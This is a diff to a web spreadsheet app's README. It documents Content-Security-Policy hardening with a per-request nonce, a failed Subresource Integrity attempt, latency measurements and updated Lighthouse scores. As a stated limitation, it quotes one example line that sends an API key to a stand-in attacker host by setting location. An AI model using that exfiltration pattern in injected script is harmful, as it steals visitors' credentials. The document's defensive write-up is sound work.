@@ -1540,6 +1540,7 @@ formulaEngine/ (tokenizer → parser → evaluator → functions)
 
 ```
 src/
+  proxy.ts                   # Mints a CSP nonce per request — the reason script-src has no 'unsafe-inline'
   app/
     page.tsx                 # The landing page at / — features, screenshots, and the button into the app
     app/page.tsx             # The app itself at /app — assembles components from store state (holds none)
@@ -1996,14 +1997,38 @@ So there is now a **Content-Security-Policy** (`next.config.ts`) aimed at the st
 injected script cannot `fetch` a stolen key to an attacker's server, and `form-action` closes the
 form route.
 
-**What it does not do, written here rather than left to be discovered:**
+**`script-src` has no `'unsafe-inline'` any more**, and getting there took two attempts worth
+writing down.
 
-- `script-src` still carries `'unsafe-inline'`. Next.js hydrates through inline scripts, and the
-  real fix — a per-request nonce from middleware — makes every page dynamic and throws away the
-  static rendering this app's speed rests on. **This is not a fix for XSS**, and pretending it were
-  would be worse than having no policy at all.
-- CSP cannot stop a top-level navigation (`location = "https://evil.example/?k=" + key`). The
-  `navigate-to` directive was dropped from the spec.
+The first was **Subresource Integrity** (`experimental.sri`), which hashes every emitted bundle and
+is appealing because it keeps pages prerendered. It does not work, and the browser said exactly
+why: six scripts got an `integrity` attribute and **two inline scripts did not**, because React's
+payload is part of the document. Chrome refused both and React threw #412 — the page never
+hydrated. SRI hashes files; a script inside the HTML is not a file. The setting stays anyway, since
+an integrity check on what a CDN serves costs nothing.
+
+The second is what ships: [`src/proxy.ts`](src/proxy.ts) mints a nonce per request, puts it in the
+policy and in the request headers, and Next stamps it onto its own inline scripts.
+`'strict-dynamic'` comes with it, which is what makes the directive strict rather than decorative —
+without it, a script injected with a `src` pointing at our own origin is still allowed by `'self'`.
+
+**It costs prerendering, and the cost was measured before it was accepted.** A nonce must differ
+per request, so no page can be built ahead of time; `await connection()` in the root layout says so
+out loud. Time to first byte on the same machine, twelve requests each, median:
+
+| | prerendered | per request |
+|---|---|---|
+| `/` | 5.3 ms | 14.6 ms |
+| `/app` | 5.6 ms | 19.9 ms |
+
+About ten to fifteen milliseconds of server time, against an LCP of 3.4 s on throttled mobile — it
+does not show. The real cost is that the HTML can no longer be cached at a CDN edge, which would
+matter for an audience spread across the world and does not matter for this.
+
+**What it still does not do:** CSP cannot stop a top-level navigation
+(`location = "https://evil.example/?k=" + key`). The `navigate-to` directive was dropped from the
+spec. Narrowing the exits is not the same as fixing XSS, and a strict `script-src` makes the
+injection itself much harder without making it impossible.
 
 **Measured, not asserted.** A `fetch` from inside the page to an origin outside the policy is
 refused — `Refused to connect … violates the following Content Security Policy directive` — while
@@ -2092,11 +2117,17 @@ Measured against a local production build (`npm run build && npm run start`) wit
 
 | Page | Performance | Accessibility | Best practices | SEO |
 |---|---|---|---|---|
-| Landing `/` | 85 | **100** | **100** | **100** |
-| App `/app` | 86 | **100** | **100** | **100** |
+| Landing `/` | 90 | **100** | **100** | **100** |
+| App `/app` | 84 | **100** | **100** | **100** |
 
-`/` — FCP 1.3s · LCP 3.8s · TBT 140ms · **CLS 0** · Speed Index 4.1s
-`/app` — FCP 1.0s · LCP 3.8s · TBT 200ms · **CLS 0** · Speed Index 1.0s
+`/` — FCP 1.0s · LCP 3.4s · TBT 160ms · **CLS 0** · Speed Index 1.0s
+`/app` — FCP 1.0s · LCP 3.5s · TBT 310ms · **CLS 0** · Speed Index 1.0s
+
+**Re-measured after the CSP nonce turned prerendering off**, rather than left standing from before
+it. The scores moved by a few points in both directions, which is what a Lighthouse run does
+between any two attempts; the +10–15 ms of server time the nonce costs does not show up against an
+LCP of three and a half seconds. A number in a README that was true on an older build is the
+failure this project has already had twice, so it was cheaper to run it again than to argue.
 
 **Accessibility 100 on both pages**, which agrees with the [`check:a11y`](#-testing) gate that runs axe on
 every PR — two different tools, same answer.
@@ -2391,10 +2422,11 @@ What's not done yet, and why — to show this is a known gap, not something forg
       `connect-src` names only `api.anthropic.com` and the Supabase origin when one is configured, so an
       injected script cannot send the visitor's API key anywhere, alongside `frame-ancestors`,
       `object-src`, `base-uri`, `form-action`, `Referrer-Policy`, `nosniff` and `Permissions-Policy`.
-      It is a flow in `check:e2e`, proved by removing the header and watching the gate fail. **Still open:
-      `script-src` keeps `'unsafe-inline'`**, because Next.js hydrates through inline scripts and a
-      per-request nonce needs middleware, which makes every page dynamic. This closes the exit; it does
-      not stop XSS.
+      It is a flow in `check:e2e`, proved by removing the header and watching the gate fail. **`script-src`
+      no longer carries `'unsafe-inline'`** — `src/proxy.ts` mints a per-request nonce alongside
+      `'strict-dynamic'`. SRI was tried first to keep pages prerendered and does not work: an inline
+      script is not a file and cannot be hashed, so the page never hydrated at all. The price is
+      prerendering, measured at +10–15 ms of TTFB. Still open: CSP cannot stop a top-level navigation.
 - [x] **Tests that actually open the app (E2E) in CI** — done: `npm run check:e2e` drives Chromium
       through 8 flows as its own CI job — a formula recalculating on screen, an `.xlsx` round trip through
       the real buttons, keyboard-only navigation, undo, and whether anything is announced. Three bugs this
